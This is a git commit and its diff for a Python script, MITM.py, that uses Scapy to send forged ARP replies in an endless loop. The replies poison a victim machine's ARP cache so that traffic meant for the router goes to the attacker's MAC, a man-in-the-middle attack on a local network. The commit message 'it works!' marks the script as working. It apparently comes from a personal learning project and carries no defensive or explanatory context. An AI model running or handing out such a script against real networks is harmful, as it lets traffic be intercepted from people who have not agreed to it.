1fbb1a14a159df30f7605be935621097d80f496b
YuvalN1211 <yuvaln2010@gmail.com>
2026-07-21 13:22:54 +0300

    it works!

--- MITM.py
+++ MITM.py
@@ -1,15 +1,17 @@
-from scapy.all import ARP, send
+import time
+from scapy.all import *
 
 my_ip = "192.168.1.161"
-my_mac = "70-D8-23-4E-B1-FE"
+my_mac = "e8:9c:25:4c:02:de"
 
 victim_ip = "192.168.1.145"
-victim_mac = "9a-cd-7e-d0-0b-6d"
+victim_mac = "9a:cd:7e:d0:0b:6d"
 
 router_ip = "192.168.1.1"
-router_mac = "20-b0-01-36-b4-a0"
+router_mac = "20:b0:01:36:b4:a0"
 
 while True:
-    victim_packet = ARP(op = 2, psrc = router_ip, hwsrc = my_mac, pdst = victim_ip, hwdst = victim_mac)
+    victim_packet = Ether(dst=victim_mac) / ARP(op = 2, psrc = router_ip, pdst = victim_ip, hwdst = victim_mac, hwsrc = my_mac)
     print(victim_packet)
-    send(victim_packet)
+    sendp(victim_packet)
+    time.sleep(1)
